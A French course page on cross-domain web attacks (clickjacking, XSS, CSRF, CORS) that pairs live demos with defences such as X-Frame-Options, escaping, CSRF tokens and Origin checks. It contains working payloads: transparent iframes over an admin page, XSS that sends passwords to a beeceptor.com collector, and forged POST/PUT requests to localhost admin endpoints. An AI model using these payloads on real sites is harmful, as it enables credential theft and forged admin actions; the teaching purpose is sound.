---
title : "Les attaques basées sur des croisements de domaines"
description: ""
lead: ""
draft: false
images: []
weight: 202
mermaid: true
---

Objectifs de l'attaquant :
- Un utilisateur connecté sur un site légitime envoie des données à un site attaquant
- Un site attaquant force un utilisateur à faire une opération non souhaité sur le site légitime

### Le clickjacking

Vous avez Gagné<br/>
<button>Cliquez la</button>
<iframe id="t"
    title="t"
    width="1500"
    height="1000"
    style="opacity: 0.00000000001; position: relative;top: -25em; left: -46em;"
    src="http://localhost:8080/admin">
</iframe>

Vous avez Gagné, regardez mieux<br/>
<button>Cliquez la</button>
<iframe id="t"
    title="t"
    width="1500"
    height="1000"
    style="opacity: 0.3; position: relative;top: -25em; left: -46em;"
    src="http://localhost:8080/admin">
</iframe>


**Les `<iframe>`**
- Principe légitime à la base : afficher une page web sur une autre page web
- Comportements détournés
- Clickjacking = on cache une iframe par dessus un bouton aparemment légitime

```html
<iframe style="opacity: 0" src="https://le-site-des-admins">
```

**XFS Cross Frame Scripting** : principe général d'attaque consistant à injecter le site légitime sur le site du pirate via un iframe

**Attaque INDIRECTE**

=> **Protection PASSIVE**

- on va dire au navigateur que le site n'a aucune raison légitime d'être dans une iframe
  - Des entêtes standards existent :
  ```
  X-Frame-Options:<DENY|SAMEORIGIN|ALLOW-FROM https://example.com/>;
  ```
  - On filtre donc les origines qui ont le droit d'afficher l'iframe
  - /!\ Absence d'entête = autorisé de n'importe quel source



### L'injection de code... côté client !

<script>
		var fonction = function () {
			myUl = document.getElementById("myUl");
			myTxt = document.getElementById("scriptEvil").value;
			var node = document.createElement("LI");
			node.innerHTML = myTxt;
			myUl.appendChild(node);
		}
</script>

>#### École municipale de Kelkepare
>**Inscription d'un nouvel élève**
>
>Prénom : <input id="scriptEvil" type="text" /> <button onClick="fonction()">Inscrire l'élève</button>
>
><ul id="myUl"></ul>


Et si j'écrit dans le formulaire :
```
<form action="https://securite-applicative.free.beeceptor.com" >Entrez votre mot de passe : <input type="password" name="password" /><button type="submit" formtarget="_blank">Me connecter</button></form>
```

Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative

Déclinable à souhait...
```
<button onclick="window.location='https://securite-applicative.free.beeceptor.com'" >Continuer</button>
```

On peut ainsi forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action
- En le redirigeant sur la page avec des paramètres de requete trafiqués
- En stockant en base un code qui va être réaffiché

On peut ainsi rajouter ce genre de code sur la page de l'utilisateur
```html
<script>document.location="https://no.domain"</script>
```
```html
<script>
document.getElementsByTagName("body")[0].innerHTML("
<form action='https://no.domain' >
<br>Connectez vous !<br>
<input type='text' name='email'>
<input type='password' name='mot de passe'>
<input type='submit' value='Connexion'>
</form>
")
</script>
```

On parle de **XSS (Cross-Site Scripting)**

**Pourquoi ?**
- Vol de données, en particulier des cookies de session ([explications](/docs/failles/cookies/))
- Redirection malveillante

**Comment ?**
- Consiste à injecter du code et en particulier des script dans une page web (**donc éxécuté par l'utilisateur dans son navigateur**)
- L'attaquant fournit une requête vers un site légitime mais dont le contenu injecte le code
- L'attaquant peut aussi profiter d'une non validation des données persistantes (BDD)


**Plusieurs types de XSS**
- Injection "en direct" par le serveur, on parle de reflected XSS
- On l'appelle DOM XSS, si elle consiste à modifier le DOM via un script
- Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n'a même plus besoin de fournir un lien trafiqué à l'utilisateur.


**Attaque INDIRECTE**
=> **Protection PASSIVE** .. et un peu **ACTIVE**

**Sécurité active :**
- Vérifier les entrées utilisateurs !
- Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple `${fn:escapeXml(string)}` dans une EL en JSP)
- Certains framework récent échappe par défaut, par exemple les template thymeleaf avec l'injection de variable `th:text` échappent les caracteres spéciaux html, il faut expliciter si vraiment on ne veut pas echapper...  ~~`th:utext`~~

**Sécurité passive :**
- [Résumé des headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- Content Security Policy (CSP) [Prez](https://developer.mozilla.org/fr/docs/Web/HTTP/CSP)  [Spec](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- (deprecated) [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection) -> Ne plus utiliser

**Compléments pour la protection des cookies**
- Forcer les cookies à être "secure" (utilisable en https uniquement), "httpOnly" (non utilisable dans les scripts)
- Précision : il s'agit de sécurité **déclarative** dont la mise en oeuvre est à la charge du navigateur


## Les attaques CSRF 

Si on combine les failles précédentes :
- Une inteface grand public qui permet de stocker librement du texte non vérifié (disons une interface "contacter l'admin")
- Une interface admin qui affiche des messages sans controle
- Un autre site de gestion ou l'admin est préalablement connecté (ou auquel la connexion SSO est invisible)



<script>
		var fonction_csrf = function () {		
			myTxt = document.getElementById("scriptEvil_csrf").value;
			window.localStorage.setItem('message_csrf', myTxt);
		}
</script>

>#### École municipale de Kelkepare
>**Envoyez un message à l'admin**
>
>Votre message : <input id="scriptEvil_csrf" type="text" /> <button onClick="fonction_csrf()">Envoyez !</button>
>
>-------
>
> (https://admin-message.kelkepare.com)
>#### Interface Admin
>**Vos messages :**
><ul id="myUl_csrf">
></ul>
>
>
>--------
>
> (https://admin-base.kelkepare.com)
>#### Interface admin bis
>
><form>
><select><option>ajouter</option><option>supprimer</option></select>
><select><option>eleve</option><option>allUsers</option></select>
><button type="submit" formtarget="_blank">Je sais ce que je fais</button>
></form>
>
>

<script>
    myUl = document.getElementById("myUl_csrf");
    var node = document.createElement("LI");
		node.innerHTML = window.localStorage.getItem('message_csrf');
		myUl.appendChild(node);
</script>

Si on envoie le message suivant ?
```
<script>
var request = new XMLHttpRequest();
request.open('POST', 'https://admin-base.kelkepare.com/cible-du-form', false);
resquest.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------395028195436618018493550684239");
request.send("-----------------------------395028195436618018493550684239\n"+
"Content-Disposition: form-data; name='action'\n"+
"\n"+
"supprimer\n"+
"-----------------------------395028195436618018493550684239\n"+
"Content-Disposition: form-data; name='quoi'\n"+
"\n"+
"allUsers\n"+
"-----------------------------395028195436618018493550684239--"
);
</script>
```



>
> Security Nightmare
>
> Et si on postait sur le forum ?
> 
```
<script>
var request = new XMLHttpRequest();
request.open('POST', 'http://localhost:8080/admin/promote/evil', false);
request.send();
</script>
```
>
>
>
>






Le script va simuler un clic dans le formulaire avec les options que j'ai choisi. L'admin étant connecté préalablement, le clic va bien être éxécuté en tant que lui-même (le navigateur va légitimement envoyer le cookie de session, on est sur le bon domaine, en https, etc)

On parle d'une attaque de type **CSRF** ou Cross-Site Request Forgery

- scénario : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l'action s'effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.


- On ne cherche pas à empécher une acton malveillante en soi
- On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s'assurer que l'utilisateur réalise son opération en pleine conscience.

**Protections :**
- Vérifier les entrées utilisateurs ? 
- Ici, l'action à bloquer est légitime...

- Faire en sorte qu'à chaque appel d'un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s'assurer de la cohérence de la requête
- Des bibliothèques peuvent aider à cette protection : Spring security, pac4j

- Il faut alors ajouter dans chaque formulaire le jeton en hidden
```html
<form action="/cible-du-form"
  method="post">
  <select><option>ajouter</option><option>supprimer</option></select>
  <select><option>eleve</option><option>allUsers</option></select>
  <input type="hidden"
    name="${_csrf.parameterName}"
    value="${_csrf.token}"/>
  <button type="submit">Je sais ce que je fais</button>
</form>
```

- Dans les version récentes de Spring, avec la configuration par défaut, l'input hidden est rajouté automatiquement sur chaque champ hidden (fonctionne au moins avec le langage de templating thymeleaf)
- Principe : tout POST ne contenant pas ce paramètre se soldera par une 403
- Potentiellement pas nécessaire sur tout le site
- Pour lever la protection en spring security (en Spring 6):
```java
http.csrf(csrf -> csrf.ignoringRequestMatchers(...)); // l'ignorer sur certaines url
http.csrf(csrf -> csrf.disable()); // l'ignorer complètement -> Web Service
```

## CSRF et application stateless

<script>
var evil_cors_1 = function(){
    var request = new XMLHttpRequest();
    request.open('GET', 'http://localhost:8080/api/messages/admin', false);
    request.send();
    console.log(request.response);
}
var evil_cors_2 = function(){
    var request = new XMLHttpRequest();
    request.open('POST', 'http://localhost:8080/admin/promote/evil', false);
    request.send();
}
var evil_cors_3 = function(){
    var request = new XMLHttpRequest();
    request.open('PUT', 'http://localhost:8080/admin/promote/evil', false);
    request.send();
}
</script>

>
> Security Nightmare
>
> <button onClick="evil_cors_1();">Cliquez ici, ça ne risque rien !!!</button>
> <button onClick="evil_cors_2();">La c'est moins glop !!!</button>
> <button onClick="evil_cors_3();">La ça va mieux !!!</button>
>
>



La protection précédente fonctionne dans un mode STATEFUL, c'est à dire que l'algorithmique impose le maintien d'une session, dans laquelle on peut stocker des élements d'état permettant de suivre le déroulé logiques des actions de l'utilisateur.

Les architectures proposent cenpendant de plus en plus des situation STATELESS, typiquement l'application javascript et son api sont stateless. On peut introduire un peu de stateful dans le cadre de l'appli js en local dans le navigateur, c'est plutôt proscrit côté API.

Le formulaire est côté JS, la protection précédente n'a plus aucun sens puisque l'api ne peux pas gérer de contrôle d'état.

Si on essaie de reproduire l'attaque précédente, on va écrire un script malveillant qui attaque directement l'API.
Dans le cadre d'attaque cherchant à usurper un individu priviléié, à noter qu'il n'est pas censé y avoir de gestion de cookie, donc cela implique d'avoir récupéré un jeton authentifiant de l'utilisateur

Cependant ce scénario d'attaque sert aussi à récupérer une info disponible sur un réseau interne sans authentification par exemple

{{< mermaid class="bg-white text-center" >}}
sequenceDiagram
    actor U as Alphonse
    participant A as App interne
    participant S as App internet malveillante
    U->>S: Connexion site attaquant
    S->>U: recup app js maveillante
    U->>U: exécution script
    note over U,S: script <br/> GET /app-intenre/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: GET /app-intenre/donnee-sensible
    A->>U: donnee-sensible
    note over U,S: script <br/> envoie donnee-sensible site attaquant
    U->>S: donnee-sensible
{{< /mermaid >}}

Pour contrer cette attaque, on va plutôt s'interesser à la source du script.

### La protection CORS

CORS = Cross Over Resource Sharing

Même si l'éxécution du script se passe côté navigateur, on peut quand même contrôler la source du script éxécuté.

Les navigateurs envoient un entête `Origin`contenant l'exact domaine source du script qui éxécute la requête HTTP.

Les navigateurs envoient systématiquement et automatiquement l'entête `Origin` (à moins d'utiliser Netscape 8 ou IE 6)

**Le navigateur n'autorise pas la modification de cet entete par script**

{{< mermaid class="bg-white text-center" >}}
sequenceDiagram
    actor U as Alphonse
    participant A as App interne
    participant S as App internet malveillante
    U->>S: Connexion site attaquant
    S->>U: recup app js maveillante
    U->>U: exécution script
    note over U,S: script <br/> GET /app-intenre/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: GET /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
{{< /mermaid >}}


Au sens CORS, une source est
- un protocole
- un nom de domaine
- un port

- http://localhost:8080 n'est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent

Comment réagit app-interne ?

**Cas 1 : les devs de app-interne ne savent pas ce qu'est CORS**
- Aucun controle de l'en-tete
- si un traitement est fait en amont de renvoyer donnée-sensible, il est effectué
- Le site renvoie donnée-sensible

Le navigateur lit la réponse AVANT de la fournir au script
**PAS d'entete CORS => le navigateur bloque la réponse**
- ouf...

=> Par défaut la protection CORS est bloquante

- Petit problème, et si le traitement pré-envoi donnée-sensible n'est pas idempotent ?
L'action est quand même réalisée

Les navigateurs ont ajoutés un "pre-flight" sur les requêtes éxécutées par script. D'après la spec, le pre-flight n'est réalisé pour toute requête sauf GET et POST "complexe". En pratique les navigateurs ont tendance à le systématiser.
La logique initiale étant qu'une action non idempotente n'est pas censée être implémentée sur un GET.

Le navigateur va envoyer d'abord un "OPTION" sur la requête demandée et controler la réponse => on bloque en amont l'éventuel traitement.


{{< mermaid class="bg-white text-center" >}}
sequenceDiagram
    actor U as Alphonse
    participant A as App interne
    participant S as App internet malveillante
    U->>S: Connexion site attaquant
    S->>U: recup app js maveillante
    U->>U: exécution script
    note over U,S: script <br/> PUT /app-intenre/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: OPTION /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
    A->>U: réponse
    note over A,U: pas d'entete spécifique CORS <br/> => blocage de l'envoi réel
{{< /mermaid >}}


**Cas 2 : Les devs ont pris en compte le besoin d'être appelé depuis un script**

Cas d'une requete illégitime

{{< mermaid class="bg-white text-center" >}}
sequenceDiagram
    actor U as Alphonse
    participant A as App interne
    participant S as App internet malveillante
    U->>S: Connexion site attaquant
    S->>U: recup app js maveillante
    U->>U: exécution script
    note over U,S: script <br/> GET /app-intenre/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: GET /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
    A->>A: Controle de l'entete Origin si existant
    note over A: l'entete Origin n'est pas autorisé
    A->>U: 403 c'est non !
    note over A,U: pas d'entete spécifique CORS <br/> => blocage de l'envoi réel
    U->>U: exécution script
    note over U,S: script <br/> PUT /app-intenre/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: OPTION /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
    A->>A: Controle de l'entete Origin si existant
    note over A: l'entete Origin n'est pas autorisé
    A->>U: 403 c'est non !
    note over A,U: pas d'entete spécifique CORS <br/> => blocage de l'envoi réel
{{< /mermaid >}}


Remarque : Dans le cas de blocage, le navigateur répond au script comme un échec de connexion (il ne précise pas que c'est un problème de CORS) *Le script ne fait pas la difference entre un echec de connexion et une erreur cors*
On peut cependant voir l'erreur loggée


Cas d'une requête légitime

{{< mermaid class="bg-white text-center" >}}
sequenceDiagram
    actor U as Alphonse
    participant A as App interne
    participant S as App interne frontend
    U->>S: Connexion frontend
    S->>U: recup app légitime
    U->>U: exécution script
    note over U,S: script <br/> GET /app-intenre/donnee-sensible
    U->>A: GET /app-intrne/donnee-sensible <br/> Origin: https://app-interne-frontend.com
    A->>A: Controle de l'entete Origin si existant
    note over A: l'entete Origin est autorisé
    A->>U: 200 donnée sensible <br> Access-Control-Allow-Origin: https://app-interne-frontend.com
    note over A,U: entete CORS OK ! <br/> => transfert au script
    U->>U: exécution script
    note over U,S: script <br/> PUT /app-intenre/donnee-sensible
    U->>A: OPTION /app-intrne/donnee-sensible <br/> Origin: https://app-interne-frontend.com
    A->>A: Controle de l'entete Origin si existant
    note over A: l'entete Origin est autorisé
    A->>U: 200 ok <br/> Access-Control-Allow-Origin: https://app-interne-frontend.com
    note over A,U: entete CORS ok ! <br/> => éxécution de la vraie requête
    U->>A: PUT /app-intrne/donnee-sensible <br/> Origin: https://app-interne-frontend.com
    A->>U: 204 c'est fait ! <br/> Access-Control-Allow-Origin: https://app-interne-frontend.com
{{< /mermaid >}}

Cas ou ça doit marcher mais on a eu la flemme

{{< mermaid class="bg-white text-center" >}}
sequenceDiagram
    actor U as Alphonse
    participant A as App interne
    participant S as App internet malveillante
    U->>S: Connexion site attaquant
    S->>U: recup app js maveillante
    U->>U: exécution script
    note over U,S: script <br/> GET /app-intenre/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: GET /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
    A->>A: PAS de controle de l'entete Origin
    A->>U: 200 donnée sensible <br/> Access-Control-Allow-Origin: *
    note over A,U: entete CORS générique <br/> => transmission au script
    U->>U: exécution script
    note over U,S: script <br/> PUT /app-interne/donnee-sensible <br/> donnée sensible sans authent <br/> parce que on est tranquille l'app est interne
    U->>A: OPTION /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
    A->>A: PAS de Controle de l'entete Origin
    A->>U: 403 Ok <br/> Access-Control-Allow-Origin: *
    note over A,U: entete générique CORS <br/> => éxécution de la vraie requête
    U->>A: PUT /app-intrne/donnee-sensible <br/> Origin: https://site-pirate.com
    A->>U: 204 c'est fait ! <br/> Access-Control-Allow-Origin: *
{{< /mermaid >}}

<!-- Scénario d'attaque :
- J'arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d'Internet. L'information est ainsi chargée sur la page et la suite du script peut par exemple la renvoyer au pirate. -->

<!-- Contre-attaque :
- Seul le navigateur sait le site réel où il a récupéré le site
- Sur tout navigateur (récent), un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS
- => La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source -->

<!-- *Le site dit : voici l'url des sites qui peuvent m'appeler* -->



<!-- - Pour les requêtes GET et POST "simple", supposées sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s'affiche qu'en cas de validation de CORS
- Pour les autres requêtes (avec effets de bord), le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n'exécute la requête qu'en cas de validation
- !!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes
 -->



<!-- 
- C'est donc le serveur qui a la charge de lire l'entête `Origin`, de répondre ou non selon le contenu
- Le serveur DOIT ajouter l'entete `Access-Control-Allow-Origin`  en cas de succès
- Par défaut un serveur ne va bien sûr rien renvoyer et sera donc impossible à appeler par script
- On peut envisager de renvoyer `Access-Control-Allow-Origin: *` si le site ne fournit que des données publiques non sensibles -->



<!-- - Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest().
- Le navigateur ajoute l'entete Origin à la requête
- Cet entête n'est pas modifiable par script -->

<!-- ```
Origin: https://localhost:8443
``` -->


<!-- - Le serveur recoit la requete et peut contrôler la présence de Origin s'il s'attend à de telles requêtes via script
- Le serveur possède un certain nombre de domaine autorisés à le contacter par script et potentiellement tous (\*) -->


<!-- - Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés
- Si le serveur choisit de répondre et qu'il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin : -->

<!-- ```
Access-Control-Allow-Origin: https://localhost:8443
Access-Control-Allow-Origin: http://localhost:8080
``` -->
<!-- 
- S'il accepte n'importe quel requête issue d'un script :

```
Access-Control-Allow-Origin: *
``` -->


<!-- - Le navigateur lit la réponse du serveur -->



Gestion des erreurs :
- Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée

Test :
```html
<script>
		var testCors = function () {
			var req = new XMLHttpRequest()
			req.open('GET', 'https://insee.fr/fr/accueil', false);
			req.send();
		}
<script>
<button onClick="testCors();">Test CORS KO</button>
```

<script>
		var testCors = function () {
			var req = new XMLHttpRequest()
			req.open('GET', 'https://insee.fr/fr/accueil', false);
			req.send();
		}
</script>
<button onClick="testCors();">Test CORS KO</button>


- Attention à l'autorisation globale (elle peut parfois être nécessaire cependant) : `Access-Control-Allow-Origin: *`
- L'idéal est de controler côté serveur l'entete "Origin" et de personnaliser l'entete "Access-Control-Allow-Origin" si on accepte
- Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS


- Il faut garder à l'esprit que CORS est une sécurité *côté client* pour l'empécher de faire n'importe quoi malgré lui : fournir à un script une information que le serveur n'a pas prévu d'être utilisée par un script.




